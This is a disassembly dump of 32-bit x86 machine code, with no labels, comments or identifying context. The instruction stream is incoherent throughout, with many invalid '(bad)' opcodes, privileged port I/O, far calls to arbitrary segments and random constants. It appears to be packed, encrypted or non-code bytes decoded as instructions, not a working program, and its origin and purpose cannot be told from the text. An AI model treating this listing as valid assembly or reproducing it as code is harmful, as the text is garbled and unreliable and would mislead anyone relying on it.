  4170e6:	mov    ah,0xae
  4170e8:	popa   
  4170e9:	pushf  
  4170ea:	test   DWORD PTR [esi],0x222ef863
  4170f0:	xchg   DWORD PTR [eax+0x60aa2fce],ecx
  4170f6:	xor    bh,0x48
  4170f9:	loope  0x4170ef
  4170fb:	push   esi
  4170fc:	lahf   
  4170fd:	mov    dl,0x9
  4170ff:	push   edi
  417100:	push   edx
  417101:	inc    ebp
  417102:	or     eax,0xfdc8e53
  417107:	xchg   edx,eax
  417108:	out    0x9d,eax
  41710a:	inc    eax
  41710b:	and    ebx,ebp
  41710d:	add    DWORD PTR [ecx+0x0],0x5d7c7fe1
  417114:	dec    ebp
  417115:	and    edi,DWORD PTR [esi-0x518f9736]
  41711b:	push   edx
  41711c:	push   ebx
  41711d:	or     bl,cl
  41711f:	stos   BYTE PTR es:[edi],al
  417120:	out    dx,eax
  417121:	std    
  417122:	std    
  417123:	or     DWORD PTR [eax],esi
  417125:	xor    al,0x5c
  417127:	jmp    0x417166
  417129:	push   esi
  41712a:	pop    eax
  41712b:	out    dx,al
  41712c:	out    0x10,al
  41712e:	xlat   BYTE PTR ds:[ebx]
  41712f:	cmp    al,0xd0
  417131:	or     BYTE PTR [ebp-0x35],bl
  417134:	(bad)  [ecx]
  417136:	mov    bl,BYTE PTR gs:[edx+edx*8]
  41713a:	test   DWORD PTR [esi],0x87fcb4fa
  417140:	sub    BYTE PTR [esi+0x55eb1587],bl
  417146:	and    esp,ecx
  417148:	sub    edx,DWORD PTR [edi+0x2dcc8553]
  41714e:	xor    al,0xcb
  417150:	js     0x4170e1
  417152:	imul   edx,DWORD PTR [esi+0x5d9e76aa],0x5398345a
  41715c:	sub    eax,ecx
  41715e:	or     BYTE PTR [eax],0xa8
  417161:	inc    eax
  417162:	fst    QWORD PTR [ebp+0x2a]
  417165:	xchg   ebp,eax
  417166:	or     eax,0x164e74a
  41716b:	cli    
  41716c:	pop    ss
  41716d:	pop    ecx
  41716e:	xchg   BYTE PTR ds:0x2621cc65,dl
  417174:	add    BYTE PTR [eax+0x67],al
  417177:	imul   ecx,DWORD PTR [ecx+0x4c],0xffffff87
  41717b:	sub    BYTE PTR [esi],dl
  41717d:	xchg   ecx,eax
  41717e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41717f:	pop    ecx
  417180:	test   DWORD PTR [edx],0x735d2991
  417186:	xchg   esp,eax
  417187:	mov    BYTE PTR [edx-0x62],dh
  41718a:	cmp    esp,DWORD PTR ds:0x4ec21d11
  417190:	push   es
  417191:	loope  0x4171c1
  417193:	jge    0x4171f6
  417195:	imul   ecx,ebx,0xffffffea
  417198:	xchg   BYTE PTR [ecx-0x579f348],bh
  41719e:	popf   
  41719f:	pop    esp
  4171a0:	and    dh,bh
  4171a2:	imul   ebp,DWORD PTR [eax],0xf4ef6051
  4171a8:	stos   BYTE PTR es:[edi],al
  4171a9:	or     cl,BYTE PTR [edi+esi*4-0x28]
  4171ad:	adc    dl,BYTE PTR [edx-0xc]
  4171b0:	cmp    esi,ebx
  4171b2:	jbe    0x41718b
  4171b4:	mov    ebp,0x4ee2d6e1
  4171b9:	es sub eax,0xe2e39526
  4171bf:	mov    ecx,DWORD PTR [ebp+0x706fdbd5]
  4171c5:	add    al,0xe4
  4171c7:	mov    dh,0x25
  4171c9:	inc    ebp
  4171ca:	jmp    0x4171d9
  4171cc:	iret   
  4171cd:	and    al,0xd1
  4171cf:	inc    edx
  4171d0:	sbb    bh,BYTE PTR [edi]
  4171d2:	retf   
  4171d3:	outs   dx,DWORD PTR ds:[esi]
  4171d4:	or     eax,0xfcb266ac
  4171d9:	mov    al,cs:0x5f97abd9
  4171df:	stc    
  4171e0:	pop    ss
  4171e1:	add    edi,esi
  4171e3:	or     bl,BYTE PTR [edx-0x60]
  4171e6:	sbb    DWORD PTR [esi-0x7e8c0d6],0x9f869fdb
  4171f0:	repz test cl,bh
  4171f3:	(bad)
  4171f7:	sbb    DWORD PTR [eax],esi
  4171f9:	frstor [eax-0x2b5e117c]
  4171ff:	mov    dh,0xe7
  417201:	dec    edi
  417202:	or     al,0xa6
  417204:	iret   
  417205:	inc    eax
  417206:	into   
  417207:	aaa    
  417208:	xor    BYTE PTR [ecx+0x7],ah
  41720b:	push   ebx
  41720c:	push   eax
  41720d:	call   0x4359:0xfc8d57a1
  417214:	data16 scas al,BYTE PTR es:[edi]
  417216:	push   ebp
  417217:	jno    0x4171b0
  417219:	sub    bl,BYTE PTR ds:0x553d64ec
  41721f:	cli    
  417220:	ins    DWORD PTR es:[edi],dx
  417221:	xor    eax,0x6933c613
  417226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417227:	or     al,0xb3
  417229:	mov    ebp,0x690f10e5
  41722e:	mov    ah,0xdd
  417230:	loopne 0x417254
  417232:	fs mov dl,0x7f
  417235:	push   ebx
  417236:	jbe    0x41725b
  417238:	sbb    BYTE PTR es:[esi],dl
  41723b:	ficom  DWORD PTR [ecx+0x6f]
  41723e:	jno    0x4171f0
  417240:	mov    ds:0xaa17f2dc,eax
  417245:	pop    ss
  417246:	adc    BYTE PTR [ebp-0x37a3f2fc],0xd1
  41724d:	mov    ah,0x44
  41724f:	fcom   st(5)
  417251:	push   ebp
  417252:	cmp    al,0x4e
  417254:	mov    al,0x7b
  417256:	adc    DWORD PTR [ebp+0x47],ebx
  417259:	icebp  
  41725a:	pop    esi
  41725b:	clc    
  41725c:	push   edx
  41725d:	jecxz  0x417256
  41725f:	xchg   edx,eax
  417260:	dec    edx
  417261:	out    dx,eax
  417262:	mov    ch,0x62
  417264:	xor    eax,DWORD PTR [ecx]
  417266:	xchg   ebp,eax
  417267:	dec    eax
  417268:	cmp    al,0xc8
  41726a:	mov    esi,0x2eb962a9
  41726f:	mov    WORD PTR [esi],ss
  417271:	mov    eax,ds:0xc2962914
  417276:	cmp    ebp,DWORD PTR [esi+ebp*4-0x38]
  41727a:	add    al,0x6e
  41727c:	and    al,0x6b
  41727e:	fimul  DWORD PTR [edx+eax*8]
  417281:	stc    
  417282:	jle    0x417242
  417284:	or     DWORD PTR [edx],ebp
  417286:	lds    esi,FWORD PTR [ebp+edi*4-0x4c]
  41728a:	cmp    BYTE PTR [esi*8-0x66144740],bl
  417291:	push   ebp
  417292:	in     al,dx
  417293:	xchg   BYTE PTR [ebp+0x54a034b],bl
  417299:	not    ch
  41729b:	sbb    BYTE PTR [ebp+0x73215468],ah
  4172a1:	and    eax,0x4bca22b6
  4172a6:	jp     0x4172a0
  4172a8:	fs cwde 
  4172aa:	mov    dh,0xc1
  4172ac:	add    dh,BYTE PTR [ebp+0x3d]
  4172af:	sub    BYTE PTR [eax],ch
  4172b1:	lods   eax,DWORD PTR ds:[esi]
  4172b2:	mov    edx,0xb03f0c3
  4172b7:	retf   
  4172b8:	mov    DWORD PTR [ecx+0x6e],ecx
  4172bb:	cmp    al,0xfd
  4172bd:	push   ebx
  4172be:	and    ebx,DWORD PTR [eax+0x7dc926c4]
  4172c4:	xor    eax,0x37a405ae
  4172c9:	mov    ch,0xa5
  4172cb:	cdq    
  4172cc:	mov    ecx,DWORD PTR [edi-0xe]
  4172cf:	cmp    al,0xd7
  4172d1:	cs push edi
  4172d3:	xchg   esp,eax
  4172d4:	dec    edi
  4172d5:	ffree  st(0)
  4172d7:	scas   eax,DWORD PTR es:[edi]
  4172d8:	push   esp
  4172d9:	xchg   esi,eax
  4172da:	aaa    
  4172db:	fwait
  4172dc:	and    ah,BYTE PTR [eax-0x22d3391d]
  4172e2:	jmp    0xbb2f:0xa23fa2e3
  4172e9:	ss sub al,0x34
  4172ec:	jb     0x4172c1
  4172ee:	hlt    
  4172ef:	mov    ebx,0x2ce52176
  4172f4:	inc    ebx
  4172f5:	xor    DWORD PTR [ebp+0x25],eax
  4172f8:	jne    0x417308
  4172fa:	pop    ss
  4172fb:	pop    eax
  4172fc:	or     DWORD PTR [ebp+0x5f],ebx
  4172ff:	mov    esp,0xc6186737
  417304:	nop
  417305:	mov    dl,BYTE PTR ss:[ebx+0xcf0839a]
  41730c:	mov    ch,0x1d
  41730e:	in     al,dx
  41730f:	sub    al,0x26
  417311:	jo     0x4172cb
  417313:	sahf   
  417314:	hlt    
  417315:	or     BYTE PTR [edi-0x7f],ah
  417318:	or     BYTE PTR [ebx+0x3ec92276],0x2
  41731f:	dec    eax
  417320:	aad    0x78
  417322:	cmp    eax,0xf009b737
  417327:	sub    DWORD PTR [ebp+0x35],esp
  41732a:	in     al,dx
  41732b:	in     al,0x9e
  41732d:	ss ja  0x417398
  417330:	(bad)  
  417331:	cmc    
  417332:	pushf  
  417333:	call   0x36b2:0xb0a2a7d2
  41733a:	retf   0xcb04
  41733d:	loop   0x41735a
  41733f:	jmp    0x41739d
  417341:	les    esi,FWORD PTR [edi]
  417343:	enter  0x6b48,0xcd
  417347:	or     al,0x66
  417349:	xchg   esi,eax
  41734a:	jbe    0x41734a
  41734c:	cmp    eax,0xeb6dac1
  417351:	js     0x417302
  417353:	ins    BYTE PTR es:[edi],dx
  417354:	mov    eax,ds:0x2c02be64
  417359:	jge    0x4172e0
  41735b:	loope  0x4173d0
  41735d:	inc    ecx
  41735e:	(bad)  
  41735f:	arpl   WORD PTR [edi+0x745c5cca],ax
  417365:	pop    eax
  417366:	sti    
  417367:	or     DWORD PTR [eax-0x7c],0x128386af
  41736e:	cmp    al,BYTE PTR [ecx+0x6d2dddb2]
  417374:	sbb    al,0x29
  417376:	sahf   
  417377:	fild   WORD PTR [ebx+edx*8-0x3edcae3f]
  41737e:	sbb    bh,dl
  417380:	fisttp WORD PTR [ecx]
  417382:	push   esi
  417383:	icebp  
  417384:	sahf   
  417385:	jecxz  0x41734d
  417387:	test   ebx,edi
  417389:	ss aaa 
  41738b:	push   ds
  41738c:	xchg   ecx,eax
  41738d:	test   eax,0x6b228d7
  417392:	or     ebx,DWORD PTR [ecx+edi*4+0xa2f8d8f]
  417399:	ja     0x4173cc
  41739b:	dec    esp
  41739c:	mov    edx,ebx
  41739e:	xor    eax,0x7777e7bb
  4173a3:	ins    DWORD PTR es:[edi],dx
  4173a4:	sbb    BYTE PTR [edx-0x6cf088fa],ah
  4173aa:	outs   dx,DWORD PTR ds:[esi]
  4173ab:	mov    edx,0x962d8085
  4173b0:	ins    DWORD PTR es:[edi],dx
  4173b1:	sti    
  4173b2:	xlat   BYTE PTR ds:[ebx]
  4173b3:	add    ch,bl
  4173b5:	fisubr DWORD PTR [eax-0x45]
  4173b8:	(bad)  
  4173b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173ba:	loope  0x41738a
  4173bc:	lock pop ebx
  4173be:	outs   dx,BYTE PTR ds:[esi]
  4173bf:	cmp    bl,ah
  4173c1:	lods   eax,DWORD PTR ds:[esi]
  4173c2:	std    
  4173c3:	jl     0x41742f
  4173c5:	scas   al,BYTE PTR es:[edi]
  4173c6:	aaa    
  4173c7:	pop    ecx
  4173c8:	or     eax,0x60e269df
  4173cd:	pop    eax
  4173ce:	out    dx,al
  4173cf:	push   ds
  4173d0:	sti    
  4173d1:	cmp    al,0x63
  4173d3:	jp     0x41741c
  4173d5:	pop    ebx
  4173d6:	nop
  4173d7:	xchg   ebx,eax
  4173d8:	and    BYTE PTR [esi+0x499b20a3],al
  4173de:	push   esp
  4173df:	ja     0x41745d
  4173e1:	cs fst st(2)
  4173e4:	lods   al,BYTE PTR ds:[esi]
  4173e5:	leave  
  4173e6:	jge    0x417463
  4173e8:	jne    0x4173e5
  4173ea:	in     al,0x90
  4173ec:	cmp    esi,DWORD PTR [ebp-0x2135cb5a]
  4173f2:	add    eax,DWORD PTR ds:0xbf6ceb30
  4173f8:	sub    ebp,ebx
  4173fa:	xor    edx,ecx
  4173fc:	test   eax,0x1c536108
  417401:	jle    0x417385
  417403:	push   ds
  417404:	inc    esp
  417405:	inc    edx
  417406:	pop    edi
  417407:	inc    esi
  417408:	test   BYTE PTR [esi-0x6f],bh
  41740b:	push   esp
  41740c:	outs   dx,DWORD PTR ds:[esi]
  41740d:	sbb    eax,0x432181b8
  417412:	dec    ebp
  417413:	sub    esi,DWORD PTR [ebp+0x74]
  417416:	xlat   BYTE PTR ds:[ebx]
  417417:	fdivr  DWORD PTR [ebp+0x26efced]
  41741d:	loopne 0x4173d4
  41741f:	div    DWORD PTR [ecx]
  417421:	icebp  
  417422:	sbb    bh,BYTE PTR [eax+0x78]
  417425:	ror    dl,cl
  417427:	mul    DWORD PTR [edi]
  417429:	mov    edx,esp
  41742b:	jge    0x417458
  41742d:	jbe    0x4173b6
  41742f:	mov    esi,0x5891728d
  417434:	or     BYTE PTR [edi-0x64],ch
  417437:	ret    0x9ced
  41743a:	fild   WORD PTR [edx]
  41743c:	lds    ebp,FWORD PTR [esi]
  41743e:	int    0x2a
  417440:	dec    edx
  417441:	xchg   edx,eax
  417442:	lods   eax,DWORD PTR ds:[esi]
  417443:	leave  
  417444:	push   ecx
  417445:	cmc    
  417446:	adc    DWORD PTR [eax-0x3a3ce29e],0xbeb9e618
  417450:	call   FWORD PTR [edi]
  417452:	xlat   BYTE PTR ds:[ebx]
  417453:	jne    0x417442
  417455:	mov    BYTE PTR [eax-0x1b],ch
  417458:	gs xchg esp,eax
  41745a:	fdivr  QWORD PTR [ecx-0x2ffe7f8e]
  417460:	das    
  417461:	mov    cs,ecx
  417463:	pop    eax
  417464:	shr    BYTE PTR [esi],cl
  417466:	fst    DWORD PTR [esi-0x357db3ee]
  41746c:	mov    al,0x6a
  41746e:	and    eax,0x2541a761
  417473:	cmp    ecx,DWORD PTR [ecx]
  417475:	mov    ch,bh
  417477:	mov    esi,0x360347e8
  41747c:	mov    esi,0x482bb8f2
  417481:	js     0x417403
  417483:	shl    DWORD PTR [ebx-0x55],1
  417486:	call   FWORD PTR ss:[edi]
  417489:	push   0xffffffe6
  41748b:	jnp    0x41744a
  41748d:	sbb    al,0x59
  41748f:	cmc    
  417490:	jne    0x4174f5
  417492:	and    eax,0xfa0949a5
  417497:	inc    eax
  417498:	pop    edx
  417499:	fwait
  41749a:	call   0xd5e926bd
  41749f:	mov    BYTE PTR ds:0xed09af9c,bh
  4174a5:	loope  0x4174d7
  4174a7:	add    DWORD PTR [eax+esi*1-0x6885877f],0x17247624
  4174b2:	and    cl,BYTE PTR [ebx]
  4174b4:	pop    ss
  4174b5:	xor    cl,BYTE PTR [ecx+0x59]
  4174b8:	jo     0x417520
  4174ba:	mov    bl,0xc2
  4174bc:	mov    bl,0xb9
  4174be:	jbe    0x4174e7
  4174c0:	push   cs
  4174c1:	jns    0x4174d7
  4174c3:	scas   al,BYTE PTR es:[edi]
  4174c4:	in     eax,dx
  4174c5:	xchg   BYTE PTR [ecx-0x3e],ch
  4174c8:	scas   eax,DWORD PTR es:[edi]
  4174c9:	jl     0x417547
  4174cb:	mov    edx,0xb2f7f47e
  4174d0:	or     al,0x56
  4174d2:	adc    BYTE PTR [esp+ebx*8+0x25ac6240],ah
  4174d9:	mov    BYTE PTR [esi],bh
  4174db:	mov    esi,0xfa4486c3
  4174e0:	mov    cl,0xc0
  4174e2:	sbb    BYTE PTR [esi+0x20],ch
  4174e5:	dec    eax
  4174e6:	mov    ch,0x9
  4174e8:	xchg   ecx,eax
  4174e9:	iret   
  4174ea:	add    ebp,ebp
  4174ec:	push   esi
  4174ed:	retf   
  4174ee:	mov    bl,0x98
  4174f0:	jb     0x41747d
  4174f2:	ja     0x41754e
  4174f4:	hlt    
  4174f5:	mov    al,ds:0x4a5372d3
  4174fa:	out    0x49,al
  4174fc:	mov    BYTE PTR [eax-0x50],cl
  4174ff:	addr16 fs icebp 
  417502:	inc    ecx
  417503:	(bad)  
  417504:	mov    ebx,0xe0a421c5
  417509:	es mov cl,0xb8
  41750c:	rcl    edx,0x1a
  41750f:	xchg   BYTE PTR [edx+0x16],bh
  417512:	adc    esi,DWORD PTR [edx+0x2f]
  417515:	cmp    esi,DWORD PTR [ebx+0x3707763]
  41751b:	fstp   TBYTE PTR [ebp+ebp*8+0x1]
  41751f:	sti    
  417520:	std    
  417521:	stc    
  417522:	outs   dx,BYTE PTR ds:[esi]
  417523:	call   0x9455:0xdc5317a7
  41752a:	push   ds
  41752b:	dec    ebx
  41752c:	imul   ecx,DWORD PTR [eax],0x63
  41752f:	es inc esp
  417531:	pop    edi
  417532:	mov    ebx,0x85cce358
  417537:	popa   
  417538:	mov    dl,0x97
  41753a:	imul   ebx,edi,0x7a
  41753d:	mov    edx,0x77e573e6
  417542:	dec    esp
  417543:	push   ss
  417544:	cmp    eax,0x1457f112
  417549:	inc    edx
  41754a:	shl    DWORD PTR ds:[ebx+0x3f],0xa9
  41754f:	and    DWORD PTR [ebx],ecx
  417551:	and    eax,0x12bf58c0
  417556:	je     0x4175b9
  417558:	out    dx,eax
  417559:	aad    0x7d
  41755b:	rol    DWORD PTR [ecx],0xf2
  41755e:	(bad)  
  417560:	jbe    0x4175cb
  417562:	cs jl  0x41759f
  417565:	inc    ecx
  417566:	loopne 0x41753c
  417568:	pop    edi
  417569:	sbb    al,0xd8
  41756b:	inc    esi
  41756c:	sbb    al,BYTE PTR [esp+ebp*4+0x48e7660a]
  417573:	lods   al,BYTE PTR ds:[esi]
  417574:	xor    al,BYTE PTR [eax-0x3d306a61]
  41757a:	xor    al,0xfe
  41757c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41757d:	sbb    DWORD PTR [ebx],eax
  41757f:	ficomp WORD PTR [esi]
  417581:	leave  
  417582:	je     0x4175e5
  417584:	repz push ebp
  417586:	xchg   ebx,eax
  417587:	(bad)  
  417588:	arpl   WORD PTR [ebx],sp
  41758a:	xor    eax,0x75c105b9
  41758f:	out    dx,al
  417590:	jle    0x417531
  417592:	std    
  417593:	jns    0x417585
  417595:	xchg   edx,eax
  417596:	dec    ebx
  417597:	add    al,0x10
  417599:	mov    al,0xed
  41759b:	aam    0x15
  41759d:	rcl    BYTE PTR [ecx-0x6c],1
  4175a0:	jmp    0x57a4:0x61dac84a
  4175a7:	adc    ecx,DWORD PTR [ebx-0x53]
  4175aa:	xor    BYTE PTR [ecx-0x1ba2a59d],dl
  4175b0:	mov    BYTE PTR [ebp+0x41],al
  4175b3:	fcmovbe st,st(6)
  4175b5:	adc    esp,DWORD PTR [ecx]
  4175b7:	out    0xb0,al
  4175b9:	push   ss
  4175ba:	dec    ebx
  4175bb:	je     0x41754e
  4175bd:	mov    al,0xac
  4175bf:	fldenv [esi-0x4b42fc86]
  4175c5:	and    ebp,DWORD PTR [esi+0x6654d8ef]
  4175cb:	fs loopne 0x4175bf
  4175ce:	sbb    esp,esp
  4175d0:	in     al,0x44
  4175d2:	sbb    dl,BYTE PTR [ebp+0x25]
  4175d5:	repnz das 
  4175d7:	xchg   edx,eax
  4175d8:	es std 
  4175da:	push   0x774ae3de
  4175df:	call   0xdd226bf9
  4175e4:	or     eax,0xed0b0bbd
  4175e9:	jbe    0x41762a
  4175eb:	shr    eax,0x81
  4175ee:	shr    BYTE PTR [edx],1
  4175f0:	fbld   TBYTE PTR [eax]
  4175f2:	in     al,dx
  4175f3:	in     al,0x30
  4175f5:	retf   0x1790
  4175f8:	mov    ds:0x93a7a5bd,eax
  4175fd:	pop    ebp
  4175fe:	mov    ebx,0x1f214982
  417603:	pop    edx
  417604:	out    0xac,al
  417606:	rcl    BYTE PTR [edx+0x27],1
  417609:	mov    eax,ds:0xed149d24
  41760e:	psrlq  mm5,QWORD PTR [eax+0x1cc2abcb]
  417615:	mov    edx,0xdf649c74
  41761a:	int3   
  41761b:	jmp    0x5706e2dd
  417620:	mov    ds:0x513f3fee,al
  417625:	pusha  
  417626:	div    DWORD PTR [edi]
  417628:	(bad)  
  417629:	js     0x4175e1
  41762b:	stos   DWORD PTR es:[edi],eax
  41762c:	gs pop esi
  41762e:	nop
  41762f:	std    
  417630:	retf   0x4e2a
  417633:	in     eax,dx
  417634:	test   al,0x77
  417636:	mov    ds:0x65600dba,al
  41763b:	loopne 0x4176b9
  41763d:	and    DWORD PTR [ebp-0x7edea7ce],edx
  417643:	sbb    al,0xff
  417645:	or     cl,dl
  417647:	fisttp DWORD PTR [esi-0x606b91e5]
  41764d:	mov    bh,0xf7
  41764f:	mov    BYTE PTR [edx+0x3b6d0704],cl
  417655:	hlt    
  417656:	sbb    al,0x45
  417658:	aad    0xb5
  41765a:	add    DWORD PTR [ebx+0x2d6ba49d],edx
  417660:	jnp    0x4176a8
  417662:	(bad)  
  417663:	daa    
  417664:	mov    WORD PTR [edi],?
  417666:	pop    edx
  417667:	retf   
  417668:	push   ss
  417669:	jns    0x4175f4
  41766b:	mov    DWORD PTR [edx],edx
  41766d:	sar    edi,0x92
  417670:	xor    BYTE PTR [ecx],0x16
  417673:	pop    esp
  417674:	scas   al,BYTE PTR es:[edi]
  417675:	shr    DWORD PTR [edx+0x14],1
  417678:	in     eax,dx
  417679:	sbb    BYTE PTR [eax],bl
  41767b:	push   ebp
  41767c:	clc    
  41767d:	fsubr  st,st(1)
  41767f:	test   eax,0xa74d1bae
  417684:	enter  0x942f,0x39
  417688:	mov    dh,0x5e
  41768a:	lock and ebx,eax
  41768d:	sub    cl,0x25
  417690:	xchg   edx,eax
  417691:	push   0xffffffef
  417693:	push   0xfffffffe
  417695:	out    dx,eax
  417696:	and    BYTE PTR [ecx+0x12],0xd8
  41769a:	pop    edx
  41769b:	js     0x417658
  41769d:	add    eax,0x978afdd6
  4176a2:	data16 das 
  4176a4:	in     al,dx
  4176a5:	push   ss
  4176a6:	fcom   QWORD PTR [edx-0x7e]
  4176a9:	mov    ds:0x2f8e8293,al
  4176ae:	add    esi,ebx
  4176b0:	shr    DWORD PTR [eax],1
  4176b2:	sub    edx,DWORD PTR [bp+di]
  4176b5:	xor    eax,0x3215940d
  4176ba:	push   ss
  4176bb:	mov    ecx,0xca7ea818
  4176c0:	add    al,0x62
  4176c2:	gs pusha 
  4176c4:	clc    
  4176c5:	jecxz  0x4176e4
  4176c7:	cli    
  4176c8:	imul   edi,DWORD PTR [edi+ecx*2-0x4a],0xffffffff
  4176cd:	push   0x8c799d25
  4176d2:	popf   
  4176d3:	jl     0x4176c7
  4176d5:	sti    
  4176d6:	push   ds
  4176d7:	sbb    BYTE PTR [ebx],ch
  4176d9:	jae    0x417677
  4176db:	mov    ecx,0xd84e351a
  4176e0:	jo     0x41769e
  4176e2:	cld    
  4176e3:	mov    ah,0x32
  4176e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176e6:	mov    esi,0xb6cf3e3f
  4176eb:	xchg   ebx,eax
  4176ec:	pop    ds
  4176ed:	in     eax,0x5a
  4176ef:	stos   BYTE PTR es:[edi],al
  4176f0:	mov    BYTE PTR [eax],ch
  4176f2:	sub    bl,BYTE PTR [ecx-0x16]
  4176f5:	dec    ebp
  4176f6:	lds    edi,FWORD PTR [edx-0x2486e0b3]
  4176fc:	and    eax,0x6f1a5fa0
  417701:	jmp    0x417689
  417703:	mov    bl,BYTE PTR [ecx-0x5f11684a]
  417709:	mov    esi,0x76aa74e5
  41770e:	push   0x6d519014
  417713:	shl    BYTE PTR [edx-0x71],cl
  417716:	xlat   BYTE PTR ds:[ebx]
  417717:	add    ebx,edi
  417719:	push   ebp
  41771a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41771b:	mov    edi,0xdb672b3d
  417720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417721:	jb     0x4176f6
  417723:	pop    ecx
  417724:	cmp    eax,0x60ae1b26
  417729:	or     DWORD PTR [edx+0x26a4b3f5],ebp
  41772f:	shl    BYTE PTR [esi-0x5c4e9d7c],1
  417735:	js     0x417710
  417737:	xchg   esi,eax
  417738:	js     0x417784
  41773a:	adc    ch,cl
  41773c:	or     BYTE PTR [esi-0x44678029],bl
  417742:	push   eax
  417743:	loop   0x4177af
  417745:	dec    esi
  417746:	ds push ds
  417748:	pop    ss
  417749:	in     al,dx
  41774a:	sbb    al,BYTE PTR [ebp+0x30]
  41774d:	fnsave [esi+0x25]
  417750:	mov    edi,0xdcbdfee5
  417755:	dec    esi
  417756:	push   eax
  417757:	test   al,0xe3
  417759:	and    eax,0x3c8ec82d
  41775e:	pop    ds
  41775f:	mov    ecx,0xb6ad60e6
  417764:	cli    
  417765:	stc    
  417766:	cwde   
  417767:	cwde   
  417768:	push   eax
  417769:	mov    ebx,DWORD PTR [edi+0x42]
  41776c:	jbe    0x41771a
  41776e:	push   esi
  41776f:	in     eax,0x7c
  417771:	push   esi
  417772:	test   al,0xc2
  417774:	(bad)  
  417775:	xor    ebp,DWORD PTR [eax-0x69bfd2f6]
  41777b:	out    dx,eax
  41777c:	outs   dx,BYTE PTR ds:[esi]
  41777d:	dec    esi
  41777e:	push   esp
  41777f:	mov    dh,0xd2
  417781:	add    ebp,edi
  417783:	and    eax,0xd311cb9e
  417788:	ret    
  417789:	lahf   
  41778a:	loop   0x41775b
  41778c:	jmp    FWORD PTR [edx+esi*1-0x28b64ee8]
  417793:	out    dx,eax
  417794:	retf   0xa15a
  417797:	mov    ds:0xaab76985,eax
  41779c:	pop    edi
  41779d:	fwait
  41779e:	leave  
  41779f:	test   eax,0x4d0feca4
  4177a4:	sbb    BYTE PTR [edi],0x5e
  4177a7:	jae    0x41773e
  4177a9:	rcr    bl,0x3a
  4177ac:	inc    ecx
  4177ad:	mov    eax,DWORD PTR [edx-0x2d3550ac]
  4177b3:	xor    DWORD PTR [edi],ebx
  4177b5:	inc    esi
  4177b6:	rcr    DWORD PTR [eax+ecx*8-0x6c],cl
  4177ba:	push   edi
  4177bb:	retf   
  4177bc:	xchg   esp,eax
  4177bd:	inc    esi
  4177be:	addr16 jne 0x417773
  4177c1:	mov    cl,0x47
  4177c3:	cmp    ebp,DWORD PTR [ebx]
  4177c5:	in     eax,0xeb
  4177c7:	test   BYTE PTR ds:0xd1b4dc71,0x89
  4177ce:	ret    0xc86e
  4177d1:	sub    DWORD PTR cs:[edi+0x28cfa5c9],eax
  4177d8:	add    eax,0xc5bb8955
  4177dd:	mov    ebp,0x9eb805b7
  4177e2:	fnstsw WORD PTR [eax-0x77]
  4177e5:	inc    esp
  4177e6:	outs   dx,BYTE PTR ds:[esi]
  4177e7:	xor    ecx,edi
  4177e9:	retf   
  4177ea:	push   ds
  4177eb:	push   0xb2fbe972
  4177f0:	shl    BYTE PTR [ebp+0x24],0x5b
  4177f4:	call   0xcbb0:0xf3344569
  4177fb:	jns    0x4177d6
  4177fd:	enter  0xe2e9,0x54
  417801:	adc    al,0x70
  417803:	fistp  WORD PTR [edi]
  417805:	hlt    
  417806:	add    al,0xe2
  417808:	or     DWORD PTR [eax-0x2bdc4ec3],eax
  41780e:	pushf  
  41780f:	mov    esp,0xfccd2dd5
  417814:	les    esp,FWORD PTR [ecx+0x1ab11d96]
  41781a:	xchg   ecx,eax
  41781b:	or     BYTE PTR [eax],dl
  41781d:	sub    cl,0x2b
  417820:	aam    0x3f
  417822:	add    eax,0x89497521
  417827:	fbld   TBYTE PTR [esp+ebx*8+0x16]
  41782b:	or     bh,bh
  41782d:	dec    edi
  41782e:	shl    DWORD PTR [eax-0x8e71b34],0xfb
  417835:	in     eax,dx
  417836:	cmc    
  417837:	xchg   ebp,eax
  417838:	and    al,0x9e
  41783a:	mov    bl,0x66
  41783c:	int    0xe5
  41783e:	sbb    al,0x9
  417840:	fdivp  st(2),st
  417842:	or     al,BYTE PTR [ecx-0x68]
  417845:	daa    
  417846:	sbb    al,0x2f
  417848:	mov    bh,bl
  41784a:	loope  0x4178b5
  41784c:	and    BYTE PTR [eax],dl
  41784e:	xchg   esp,eax
  41784f:	pop    edi
  417850:	pop    edi
  417851:	pop    esi
  417852:	ins    BYTE PTR es:[edi],dx
  417853:	push   cs
  417854:	lock js 0x41782b
  417857:	loope  0x4178a2
  417859:	push   cs
  41785a:	aad    0x73
  41785c:	cwde   
  41785d:	pushf  
  41785e:	dec    esp
  41785f:	iret   
  417860:	out    dx,eax
  417861:	clc    
  417862:	adc    BYTE PTR [esi+0x73],al
  417865:	lods   al,BYTE PTR ds:[esi]
  417866:	dec    ebx
  417867:	and    edi,eax
  417869:	test   DWORD PTR [ebx-0x54],esi
  41786c:	shl    ch,1
  41786e:	daa    
  41786f:	mov    cl,0x21
  417871:	and    dh,dh
  417873:	adc    DWORD PTR [eax+0x5d56c0a2],edi
  417879:	push   ecx
  41787a:	adc    al,BYTE PTR [ebp+0x51c7dbc1]
  417880:	mov    al,ds:0xfa027ee8
  417885:	fadd   st(5),st
  417887:	(bad)  
  417888:	std    
  417889:	cmp    eax,DWORD PTR es:[esi+0x7ed1f594]
  417890:	ds xchg ebp,eax
  417892:	adc    BYTE PTR [ebp-0x32],ch
  417895:	call   0x8866:0x33e5c68c
  41789c:	pop    ebx
  41789d:	nop
  41789e:	and    eax,0x25a680bc
  4178a3:	mov    eax,ds:0x4adc2709
  4178a8:	sub    cl,BYTE PTR [ecx]
  4178aa:	retf   
  4178ab:	xchg   edx,eax
  4178ac:	adc    dh,dh
  4178ae:	das    
  4178af:	dec    eax
  4178b0:	sub    dh,BYTE PTR [edi+eiz*2+0x4352dd17]
  4178b7:	inc    edx
  4178b8:	dec    ebp
  4178b9:	gs cmp esp,eax
  4178bc:	pop    ecx
  4178bd:	repnz dec eax
  4178bf:	in     eax,0x9c
  4178c1:	adc    al,0xeb
  4178c3:	lea    ecx,[ebx]
  4178c5:	shl    BYTE PTR [esi-0x3f],0x5b
  4178c9:	and    ebp,DWORD PTR [edi+0x59ea2e4d]
  4178cf:	jp     0x41788e
  4178d1:	pop    edx
  4178d2:	clc    
  4178d3:	mov    ecx,DWORD PTR [eax-0x26]
